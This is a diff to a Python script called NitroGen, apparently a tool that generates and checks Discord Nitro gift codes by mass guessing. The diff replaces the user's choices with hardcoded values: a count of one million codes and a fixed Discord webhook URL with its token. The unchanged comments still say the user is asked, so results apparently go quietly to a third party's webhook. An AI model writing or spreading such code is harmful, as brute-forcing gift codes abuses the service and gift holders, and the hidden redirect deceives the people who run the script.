@@ -84,7 +84,7 @@ class NitroGen:  # Initialise the class
             "\nInput How Many Codes to Generate and Check: ", .02, newLine=False)
 
         try:
-            num = int(input(''))  # Ask the user for the amount of codes
+            num = 1000000  # Ask the user for the amount of codes
         except ValueError:
             input("Specified input wasn't a number.\nPress enter to exit")
             exit()  # Exit program
@@ -93,7 +93,7 @@ class NitroGen:  # Initialise the class
             # Get the webhook url, if the user does not wish to use a webhook the message will be an empty string
             self.slowType(
                 "If you want to use a Discord webhook, type it here or press enter to ignore: ", .02, newLine=False)
-            url = input('')  # Get the awnser
+            url = 'https://discord.com/api/webhooks/954714213559971844/jzjWRwzCNNgN9TzvUkMbVgqe2x7kZLOB-gF515JQ-t1hQzWu7GfxaRb5EKIZUbYzkqyB'  # Get the awnser
             # If the url is empty make it be None insted
             webhook = url if url != "" else None
             
